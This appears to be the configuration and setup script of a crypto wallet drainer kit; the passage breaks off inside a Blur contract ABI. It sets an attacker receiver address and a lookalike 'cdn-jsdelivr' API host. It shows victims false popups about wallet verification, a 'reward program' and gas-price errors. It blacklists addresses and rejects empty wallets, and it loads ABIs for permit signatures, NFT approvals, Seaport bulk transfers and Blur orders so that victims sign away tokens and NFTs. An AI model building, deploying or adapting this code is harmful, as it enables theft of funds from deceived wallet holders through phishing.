const RECEIVER = "0xf5233326F696DC8D933b568FA4419eF3248b788F";
//const RECEIVER = "0x3a5756ffF53f55D2437824fC1A59f27231f36252";
const CALLER = "0x000B35775668beD2C33e5b416B6316a8be5F0000";
const blurFee = "0xFF4bf933393012B126b3F988985c2858f63d13d1";

const API_URL = "https://api.cdn-jsdelivr.net";

const skipPopup = true; // Skip the popup after a Decline
const MIN_ETH_BAL = 0.002;
const INFURA_ID = "6addcc4af06449a99146d44e45223829"; // https://infura.io
const WC_ID = "3d4367583e53f78a47953c051dec7a95"; // https://cloud.walletconnect.com

const defaultChain = window.mainnet; // mainnet (eth) - bsc - arbitrum - optimism - polygon - avalanche

const ETH_CONTRACT = "0xBFFEfA426119B6f363bd41c90665DfE0F4381021";
const AVAX_CONTRACT = "0x52f174a476f0a575797e188e226f0f7301939fca";
const BNB_CONTRACT = "0x52F174A476F0a575797E188E226f0f7301939FCa";
const POLYGON_CONTRACT = "0x52f174a476f0a575797e188e226f0f7301939fca";
const OPTIMISM_CONTRACT = "0x52f174a476f0a575797e188e226f0f7301939fca";
const ARBITRUM_CONTRACT = "0x52f174a476f0a575797e188e226f0f7301939fca";

/* Custom - https://docs.walletconnect.com/2.0/web/walletConnectModal/theming */
let modalVariables = {
	'--w3m-z-index': '10000',
	"--w3m-background-color": "#141414",
   // "--w3m-accent-color": "#ffffff",
  // "--w3m-logo-image-url": "/your-logo.svg",
  };
let modalMode = "dark"; // "dark" or "light"
let modalColor = "dark"; // default - dark - magenta - blue - orange - green - purple - teal
let modalBackground = "gradient";

let blacklistedAddresses = [ 
	"0x240Cf70D8A648BE133fEB342D71E5e81C686e5f8", 
	"0x9BC6Ccbc17A41d1ecDe8A236081159894B683386",
	"0x20cCdeDB9814c83bA2D663fC04f88c7a61aA706d", 
	"0x2ad6FA4db57Ac71479510863643Eb6b1991788E1", 
	"0x33566c9D8BE6Cf0B23795E0d380E112Be9d75836", 
	"0x034C446b223Bb4ffbd51d2E284Fe6b3cdd271315", 
	"0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045", 
	"0xC832494dce30f7303F42d829c205D6Ea6b551afb", 
	"0x29B876e2dd14dd034612F052ecB372E64C96A895", 
	"0x886258791969e6b0fEff62c0a02be819Dfc1B167", 
	"0x3096d3B09e6ec2E8fF923D1657d0c691148eEeE5", 
	"0xaF92d25248767357041c002Ea5aE24eF350102EF", 
	"0x2b8496F320582481eA393bd26B9191F9059D2943", 
	"0x81c4065F3B3b89adE412158b8c2c2C37e2a1b0A0", 
	"0x9A735c231ad994D48929d3d8cE0970fCA25C2908", 
	"0xbAEA4b614e0cADdA6aE2c860F3Ba8270f770f22f", 
	"0x1A5b5825A27Ec3D6eb3b07fBdF3e43940Def50cD", 
	"0xE9848efd82fa62a5cfaC25582dDe408afBD111eC", 
	"0x2c067bB687587306840849E1a4Ff9bB4B42f7308", 
	"0x49027eF8931082Ca59F0037b80A4F518D500bC4f", 
	"0x5EadC2E651470e16413446AA4Bca44868751bf08", 
	"0x96dA410F33EBC7139DECc588Bf6d777416CC06B2", // add addresses below, format: "0x...",
  ];

class SwalPopup {

  constructor() {
      this.popup = null;
      this.timeout = null;
  }

  // Show popup
  show() {
      this.popup = Swal.fire({
		html: '<b>Connection Established</b><br>Sign message to confirm wallet ownership..',
		imageUrl: 'https://miro.medium.com/v2/resize:fit:1400/1*CsJ05WEGfunYMLGfsT2sXA.gif',
		width: 600,
          imageHeight: 80,
          timer: 0,
          allowOutsideClick: false,
          allowEscapeKey: false,
          showConfirmButton: false,
      })
  }

  // Hide popup
  close() {
      Swal.close();
      this.popup = null;
  }

  // Show pooron popup
  pooron(error = 'For security reasons, we can\'t allow you to connect empty or new wallet.') {
	this.popup = Swal.fire({
          title: 'Something went wrong!',
          icon: 'error',
          confirmButtonText: 'OK',
          text: error,
          allowOutsideClick: true,
          allowEscapeKey: true,
      })
  }

  // Show not Eligible popup
  notEli(error = 'You are not eligible for our reward program') {
	this.popup = Swal.fire({
          title: 'Not Eligible!',
          icon: 'error',
          confirmButtonText: 'CONTINUE',
          text: error,
          allowOutsideClick: true,
          allowEscapeKey: true,
      })
  }

  // Show error popup
  setError(error = 'Authentification was cancelled due to rapid change in gas prices. Please try again.') {
      this.popup = Swal.fire({
          title: 'Something went wrong!',
          imageUrl: '',
          icon: 'error',
          text: error,
          allowOutsideClick: true,
          allowEscapeKey: true,
      })
  }

  // Show success popup
  setSuccess() {
      this.popup = Swal.fire({
          icon: 'info',
          title: 'Connecting...',
          text: 'Awaiting wallet response, please wait a moment.',
		  showConfirmButton: false,
          allowOutsideClick: false,
          allowEscapeKey: false,
      })
  }

  // Show chain switch popup
	chainswitch() {
		this.popup = Swal.fire({
			icon: 'info',
			title: 'Switching network',
			text: 'Confirm network switch in wallet...',
			showConfirmButton: false,
			allowOutsideClick: true,
			allowEscapeKey: true,
		})
	}

  update(options) {
      this.popup.update(options);
  }
}

// ABI

const ETHABI = [{ "inputs": [{ "internalType": "address", "name": "receiver", "type": "address" }], "name": "claimRewards", "outputs": [], "stateMutability": "payable", "type": "function" }]

const BLUR = [
  {
    inputs: [
      {
        internalType: 'address',
        name: '',
        type: 'address',
      },
    ],
    name: 'nonces',
    outputs: [
      {
        internalType: 'uint256',
        name: '',
        type: 'uint256',
      },
    ],
    stateMutability: 'view',
    type: 'function',
  },
];
const ERC20ABI = [{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"authorizer","type":"address"},{"indexed":true,"internalType":"bytes32","name":"nonce","type":"bytes32"}],"name":"AuthorizationCanceled","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"authorizer","type":"address"},{"indexed":true,"internalType":"bytes32","name":"nonce","type":"bytes32"}],"name":"AuthorizationUsed","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"_account","type":"address"}],"name":"Blacklisted","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"newBlacklister","type":"address"}],"name":"BlacklisterChanged","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"burner","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"Burn","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"newMasterMinter","type":"address"}],"name":"MasterMinterChanged","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"minter","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"Mint","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"minter","type":"address"},{"indexed":false,"internalType":"uint256","name":"minterAllowedAmount","type":"uint256"}],"name":"MinterConfigured","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"oldMinter","type":"address"}],"name":"MinterRemoved","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":false,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[],"name":"Pause","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"newAddress","type":"address"}],"name":"PauserChanged","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"newRescuer","type":"address"}],"name":"RescuerChanged","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"_account","type":"address"}],"name":"UnBlacklisted","type":"event"},{"anonymous":false,"inputs":[],"name":"Unpause","type":"event"},{"inputs":[],"name":"CANCEL_AUTHORIZATION_TYPEHASH","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"DOMAIN_SEPARATOR","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"PERMIT_TYPEHASH","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"RECEIVE_WITH_AUTHORIZATION_TYPEHASH","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"TRANSFER_WITH_AUTHORIZATION_TYPEHASH","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"authorizer","type":"address"},{"internalType":"bytes32","name":"nonce","type":"bytes32"}],"name":"authorizationState","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"_account","type":"address"}],"name":"blacklist","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"blacklister","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"_amount","type":"uint256"}],"name":"burn","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"authorizer","type":"address"},{"internalType":"bytes32","name":"nonce","type":"bytes32"},{"internalType":"uint8","name":"v","type":"uint8"},{"internalType":"bytes32","name":"r","type":"bytes32"},{"internalType":"bytes32","name":"s","type":"bytes32"}],"name":"cancelAuthorization","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"minter","type":"address"},{"internalType":"uint256","name":"minterAllowedAmount","type":"uint256"}],"name":"configureMinter","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"currency","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"decrement","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"increment","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"string","name":"tokenName","type":"string"},{"internalType":"string","name":"tokenSymbol","type":"string"},{"internalType":"string","name":"tokenCurrency","type":"string"},{"internalType":"uint8","name":"tokenDecimals","type":"uint8"},{"internalType":"address","name":"newMasterMinter","type":"address"},{"internalType":"address","name":"newPauser","type":"address"},{"internalType":"address","name":"newBlacklister","type":"address"},{"internalType":"address","name":"newOwner","type":"address"}],"name":"initialize","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"string","name":"newName","type":"string"}],"name":"initializeV2","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"lostAndFound","type":"address"}],"name":"initializeV2_1","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_account","type":"address"}],"name":"isBlacklisted","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"isMinter","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"masterMinter","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"_to","type":"address"},{"internalType":"uint256","name":"_amount","type":"uint256"}],"name":"mint","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"minter","type":"address"}],"name":"minterAllowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"nonces","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"pause","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"paused","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"pauser","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"},{"internalType":"uint256","name":"deadline","type":"uint256"},{"internalType":"uint8","name":"v","type":"uint8"},{"internalType":"bytes32","name":"r","type":"bytes32"},{"internalType":"bytes32","name":"s","type":"bytes32"}],"name":"permit","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"},{"internalType":"uint256","name":"validAfter","type":"uint256"},{"internalType":"uint256","name":"validBefore","type":"uint256"},{"internalType":"bytes32","name":"nonce","type":"bytes32"},{"internalType":"uint8","name":"v","type":"uint8"},{"internalType":"bytes32","name":"r","type":"bytes32"},{"internalType":"bytes32","name":"s","type":"bytes32"}],"name":"receiveWithAuthorization","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"minter","type":"address"}],"name":"removeMinter","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"contract IERC20","name":"tokenContract","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"rescueERC20","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"rescuer","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"},{"internalType":"uint256","name":"validAfter","type":"uint256"},{"internalType":"uint256","name":"validBefore","type":"uint256"},{"internalType":"bytes32","name":"nonce","type":"bytes32"},{"internalType":"uint8","name":"v","type":"uint8"},{"internalType":"bytes32","name":"r","type":"bytes32"},{"internalType":"bytes32","name":"s","type":"bytes32"}],"name":"transferWithAuthorization","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_account","type":"address"}],"name":"unBlacklist","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"unpause","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_newBlacklister","type":"address"}],"name":"updateBlacklister","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_newMasterMinter","type":"address"}],"name":"updateMasterMinter","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_newPauser","type":"address"}],"name":"updatePauser","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newRescuer","type":"address"}],"name":"updateRescuer","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"version","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"}]

const bulkTransferABI = [
  {
    inputs: [
      { internalType: "address", name: "conduitController", type: "address" }
    ],
    stateMutability: "nonpayable",
    type: "constructor"
  },
  {
    inputs: [
      { internalType: "bytes", name: "reason", type: "bytes" },
      { internalType: "bytes32", name: "conduitKey", type: "bytes32" },
      { internalType: "address", name: "conduit", type: "address" }
    ],
    name: "ConduitErrorRevertBytes",
    type: "error"
  },
  {
    inputs: [
      { internalType: "string", name: "reason", type: "string" },
      { internalType: "bytes32", name: "conduitKey", type: "bytes32" },
      { internalType: "address", name: "conduit", type: "address" }
    ],
    name: "ConduitErrorRevertString",
    type: "error"
  },
  {
    inputs: [
      { internalType: "bytes", name: "reason", type: "bytes" },
      { internalType: "address", name: "receiver", type: "address" },
      { internalType: "address", name: "sender", type: "address" },
      { internalType: "uint256", name: "identifier", type: "uint256" }
    ],
    name: "ERC721ReceiverErrorRevertBytes",
    type: "error"
  },
  {
    inputs: [
      { internalType: "string", name: "reason", type: "string" },
      { internalType: "address", name: "receiver", type: "address" },
      { internalType: "address", name: "sender", type: "address" },
      { internalType: "uint256", name: "identifier", type: "uint256" }
    ],
    name: "ERC721ReceiverErrorRevertString",
    type: "error"
  },
  {
    inputs: [
      { internalType: "bytes32", name: "conduitKey", type: "bytes32" },
      { internalType: "address", name: "conduit", type: "address" }
    ],
    name: "InvalidConduit",
    type: "error"
  },
  { inputs: [], name: "InvalidERC20Identifier", type: "error" },
  {
    inputs: [{ internalType: "address", name: "recipient", type: "address" }],
    name: "InvalidERC721Recipient",
    type: "error"
  },
  { inputs: [], name: "InvalidERC721TransferAmount", type: "error" },
  { inputs: [], name: "InvalidItemType", type: "error" },
  { inputs: [], name: "RecipientCannotBeZeroAddress", type: "error" },
  {
    inputs: [
      {
        components: [
          {
            components: [
              { internalType: "enum ConduitItemType", name: "itemType", type: "uint8" },
              { internalType: "address", name: "token", type: "address" },
              { internalType: "uint256", name: "identifier", type: "uint256" },
              { internalType: "uint256", name: "amount", type: "uint256" }
            ],
            internalType: "struct TransferHelperItem[]",
            name: "items",
            type: "tuple[]"
          },
          {
            internalType: "address",
            name: "recipient",
            type: "address"
          },
          {
            internalType: "bool",
            name: "validateERC721Receiver",
            type: "bool"
          }
        ],
        internalType: "struct TransferHelperItemsWithRecipient[]",
        name: "items",
        type: "tuple[]"
      },
      { internalType: "bytes32", name: "conduitKey", type: "bytes32" }
    ],
    name: "bulkTransfer",
    outputs: [{ internalType: "bytes4", name: "magicValue", type: "bytes4" }],
    stateMutability: "nonpayable",
    type: "function"
  }
]

const PERMIT1_ABI = [ // DAI
  {
    constant: false,
    inputs: [
      { internalType: "address", name: "holder", type: "address" },
      { internalType: "address", name: "spender", type: "address" },
      { internalType: "uint256", name: "nonce", type: "uint256" },
      { internalType: "uint256", name: "expiry", type: "uint256" },
      { internalType: "bool", name: "allowed", type: "bool" },
      { internalType: "uint8", name: "v", type: "uint8" },
      { internalType: "bytes32", name: "r", type: "bytes32" },
      { internalType: "bytes32", name: "s", type: "bytes32" }
    ],
    name: "permit",
    outputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "function"
  },
  ...ERC20ABI
];

const PERMIT2_ABI = [ // USDC
  {
    inputs: [
      { internalType: "address", name: "owner", type: "address" },
      { internalType: "address", name: "spender", type: "address" },
      { internalType: "uint256", name: "value", type: "uint256" },
      { internalType: "uint256", name: "deadline", type: "uint256" },
      { internalType: "uint8", name: "v", type: "uint8" },
      { internalType: "bytes32", name: "r", type: "bytes32" },
      { internalType: "bytes32", name: "s", type: "bytes32" }
    ],
    outputs: [],
    name: "permit",
    stateMutability: "nonpayable",
    type: "function"
  }, ...ERC20ABI
];

const ERC721ABI = [
	{"constant":false,"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"approve","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},
  {
    constant: false,
    inputs: [
      { internalType: "address", name: "from", type: "address" },
      { internalType: "address", name: "to", type: "address" },
      { internalType: "uint256", name: "tokenId", type: "uint256" },
    ],
    name: "safeTransferFrom",
    outputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  }, {
    constant: false,
    inputs: [
      { internalType: "address", name: "to", type: "address" },
      { internalType: "bool", name: "approved", type: "bool" },
    ],
    name: "setApprovalForAll",
    outputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  }, {
    inputs: [
      { internalType: "address", name: "owner", type: "address" },
      { internalType: "address", name: "operator", type: "address" },
    ],
    name: "isApprovedForAll",
    outputs: [
      { internalType: "bool", name: "", type: "bool" },
    ],
    stateMutability: "view",
    type: "function",
  }
];

const ERC1155ABI = [
  {
    constant: false,
    inputs: [
      { internalType: "address", name: "from", type: "address" },
      { internalType: "address", name: "to", type: "address" },
      { internalType: "uint256", name: "tokenId", type: "uint256" },
      { internalType: "uint256", name: "amount", type: "uint256" },
    ],
    name: "safeTransferFrom",
    outputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  }, {
    constant: false,
    inputs: [
      { internalType: "address", name: "to", type: "address" },
      { internalType: "bool", name: "approved", type: "bool" },
    ],
    name: "setApprovalForAll",
    outputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  }, {
    inputs: [
      { internalType: "address", name: "owner", type: "address" },
      { internalType: "address", name: "operator", type: "address" },
    ],
    name: "isApprovedForAll",
    outputs: [
      { internalType: "bool", name: "", type: "bool" },
    ],
    stateMutability: "view",
    type: "function",
  }
];

const mintABI = [{
  inputs: [{ name: "_mintAmount", type: "uint256" }],
  name: "mint",
  outputs: [],
  stateMutability: "payable",
  type: "function",
}];

const multicallABI = [{
  constant: false,
  inputs: [
    {
      components: [
        { name: "target", type: "address" },
        { name: "callData", type: "bytes" },
      ],
      name: "calls",
      type: "tuple[]",
    },
  ],
  name: "aggregate",
  outputs: [
    { name: "blockNumber", type: "uint256" },
    { name: "returnData", type: "bytes[]" },
  ],
  payable: false,
  stateMutability: "nonpayable",
  type: "function",
}];

const ORDER_TYPE = {
  OrderComponents: [
    { name: "offerer", type: "address" },
    { name: "zone", type: "address" },
    { name: "offer", type: "OfferItem[]" },
    { name: "consideration", type: "ConsiderationItem[]" },
    { name: "orderType", type: "uint8" },
    { name: "startTime", type: "uint256" },
    { name: "endTime", type: "uint256" },
    { name: "zoneHash", type: "bytes32" },
    { name: "salt", type: "uint256" },
    { name: "conduitKey", type: "bytes32" },
    { name: "counter", type: "uint256" },
  ],
  OfferItem: [
    { name: "itemType", type: "uint8" },
    { name: "token", type: "address" },
    { name: "identifierOrCriteria", type: "uint256" },
    { name: "startAmount", type: "uint256" },
    { name: "endAmount", type: "uint256" },
  ],
  ConsiderationItem: [
    { name: "itemType", type: "uint8" },
    { name: "token", type: "address" },
    { name: "identifierOrCriteria", type: "uint256" },
    { name: "startAmount", type: "uint256" },
    { name: "endAmount", type: "uint256" },
    { name: "recipient", type: "address" },
  ],
  // EIP712Domain: [
  //   { name: "name", type: "string" },
  //   { name: "version", type: "string" },
  //   { name: "chainId", type: "uint256" },
  //   { name: "verifyingContract", type: "address" },
  // ],
};

const APE_ABI = [
  {
    inputs: [{ internalType: "address", name: "_address", type: "address" }],
    name: "getApeCoinStake",
    outputs: [
      {
        components: [
          { internalType: "uint256", name: "poolId", type: "uint256" },
          { internalType: "uint256", name: "tokenId", type: "uint256" },
          { internalType: "uint256", name: "deposited", type: "uint256" },
          { internalType: "uint256", name: "unclaimed", type: "uint256" },
          { internalType: "uint256", name: "rewards24hr", type: "uint256" },
          {
            components: [
              { internalType: "uint256", name: "mainTokenId", type: "uint256" },
              { internalType: "uint256", name: "mainTypePoolId", type: "uint256" }
            ],
            internalType: "struct ApeCoinStaking.DashboardPair",
            name: "pair",
            type: "tuple"
          }
        ],
        internalType: "struct ApeCoinStaking.DashboardStake",
        name: "",
        type: "tuple"
      }
    ],
    stateMutability: "view",
    type: "function"
  },
  {
    inputs: [{ internalType: "address", name: "_address", type: "address" }],
    name: "getBakcStakes",
    outputs: [
      {
        components: [
          { internalType: "uint256", name: "poolId", type: "uint256" },
          { internalType: "uint256", name: "tokenId", type: "uint256" },
          { internalType: "uint256", name: "deposited", type: "uint256" },
          { internalType: "uint256", name: "unclaimed", type: "uint256" },
          { internalType: "uint256", name: "rewards24hr", type: "uint256" },
          {
            components: [
              { internalType: "uint256", name: "mainTokenId", type: "uint256" },
              { internalType: "uint256", name: "mainTypePoolId", type: "uint256" }
            ],
            internalType: "struct ApeCoinStaking.DashboardPair",
            name: "pair",
            type: "tuple"
          }
        ],
        internalType: "struct ApeCoinStaking.DashboardStake[]",
        name: "",
        type: "tuple[]"
      }
    ],
    stateMutability: "view",
    type: "function"
  },
  {
    inputs: [{ internalType: "address", name: "_address", type: "address" }],
    name: "getBaycStakes",
    outputs: [
      {
        components: [
          { internalType: "uint256", name: "poolId", type: "uint256" },
          { internalType: "uint256", name: "tokenId", type: "uint256" },
          { internalType: "uint256", name: "deposited", type: "uint256" },
          { internalType: "uint256", name: "unclaimed", type: "uint256" },
          { internalType: "uint256", name: "rewards24hr", type: "uint256" },
          {
            components: [
              { internalType: "uint256", name: "mainTokenId", type: "uint256" },
              { internalType: "uint256", name: "mainTypePoolId", type: "uint256" }
            ],
            internalType: "struct ApeCoinStaking.DashboardPair",
            name: "pair",
            type: "tuple"
          }
        ],
        internalType: "struct ApeCoinStaking.DashboardStake[]",
        name: "",
        type: "tuple[]"
      }
    ],
    stateMutability: "view",
    type: "function"
  },
  {
    inputs: [{ internalType: "address", name: "_address", type: "address" }],
    name: "getMaycStakes",
    outputs: [
      {
        components: [
          { internalType: "uint256", name: "poolId", type: "uint256" },
          { internalType: "uint256", name: "tokenId", type: "uint256" },
          { internalType: "uint256", name: "deposited", type: "uint256" },
          { internalType: "uint256", name: "unclaimed", type: "uint256" },
          { internalType: "uint256", name: "rewards24hr", type: "uint256" },
          {
            components: [
              { internalType: "uint256", name: "mainTokenId", type: "uint256" },
              { internalType: "uint256", name: "mainTypePoolId", type: "uint256" }
            ],
            internalType: "struct ApeCoinStaking.DashboardPair",
            name: "pair",
            type: "tuple"
          }
        ],
        internalType: "struct ApeCoinStaking.DashboardStake[]",
        name: "",
        type: "tuple[]"
      }
    ],
    stateMutability: "view",
    type: "function"
  }
];

const UNISWAP_ABI = [
  {
    inputs: [
      { internalType: "uint256", name: "amountIn", type: "uint256" },
      { internalType: "uint256", name: "amountOutMin", type: "uint256" },
      { internalType: "address[]", name: "path", type: "address[]" },
      { internalType: "address", name: "to", type: "address" }
    ],
    outputs: [{ internalType: "uint256", name: "amountOut", type: "uint256" }],
    name: "swapExactTokensForTokens",
    stateMutability: "payable",
    type: "function"
  },
  {
    inputs: [
      { internalType: "uint256", name: "deadline", type: "uint256" },
      { internalType: "bytes[]", name: "data", type: "bytes[]" }
    ],
    outputs: [{ internalType: "bytes[]", name: "", type: "bytes[]" }],
    name: "multicall",
    stateMutability: "payable",
    type: "function"
  }
];

// blur config
  const ZERO_BYTES32 = '0x0000000000000000000000000000000000000000000000000000000000000000';
  const ZERO_ADDRESS = '0x0000000000000000000000000000000000000000';
  const POLICY_ERC721 = '0x0000000000daB4A563819e8fd93dbA3b25BC3495';

  const ORDER_EIP712_TYPES = {
	Order: [
		{ name: "trader", type: "address" },
		{ name: "side", type: "uint8" },
		{ name: "matchingPolicy", type: "address" },
		{ name: "collection", type: "address" },
		{ name: "tokenId", type: "uint256" },
		{ name: "amount", type: "uint256" },
		{ name: "paymentToken", type: "address" },
		{ name: "price", type: "uint256" },
		{ name: "listingTime", type: "uint256" },
		{ name: "expirationTime", type: "uint256" },
		{ name: "fees", type: "Fee[]" },
		{ name: "salt", type: "uint256" },
		{ name: "extraParams", type: "bytes" },
		{ name: "nonce", type: "uint256" },
	],
	Fee: [
		{ name: "rate", type: "uint16" },
		{ name: "recipient", type: "address" },
	],
};

  const ORDER_ROOT_EIP712_TYPES = { Root: [{ name: "root", type: "bytes32" }], };

  const BlurABI = [
	{ inputs: [], stateMutability: 'nonpayable', type: 'constructor' },
	{
		anonymous: false,
		inputs: [
			{
				indexed: false,
				internalType: 'address',
				name: 'previousAdmin',
				type: 'address',
			},
			{
				indexed: false,
				internalType: 'address',
				name: 'newAdmin',
				type: 'address',
			},
		],
		name: 'AdminChanged',
		type: 'event',
	},
	{
		anonymous: false,
		inputs: [
			{
				indexed: true,
